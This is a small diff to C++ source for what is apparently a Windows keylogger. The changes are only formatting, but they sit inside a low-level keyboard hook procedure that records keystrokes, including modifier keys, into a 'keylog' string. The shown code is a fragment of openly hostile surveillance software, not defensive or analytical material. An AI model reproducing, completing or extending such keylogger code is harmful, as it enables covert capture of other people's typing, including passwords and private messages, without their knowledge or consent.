@@ -46,6 +46,7 @@ HHOOK eHook = NULL; // pointer to our hook
 
 // this function can be used to "forbid" keys from the keyboard, so they are not logged or recorded when pressed
 LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {
+
     if(nCode < 0) {
         CallNextHookEx(eHook, nCode, wparam, lparam);
     }
@@ -83,8 +84,8 @@ LRESULT OurKeyboardProc(int nCode, WPARAM wparam, LPARAM lparam) {
                || key == VK_CAPITAL
                || key == VK_NUMLOCK
                || key == VK_LWIN
-               || key == VK_RWIN
-           )                        {
+               || key == VK_RWIN) {
+
             std::string KeyName = Keys::KEYS[kbs->vkCode].Name;
             KeyName.insert(1, "/"); // inserting backslash in for example: [SHIFT]...[/SHIFT]
             keylog += KeyName;
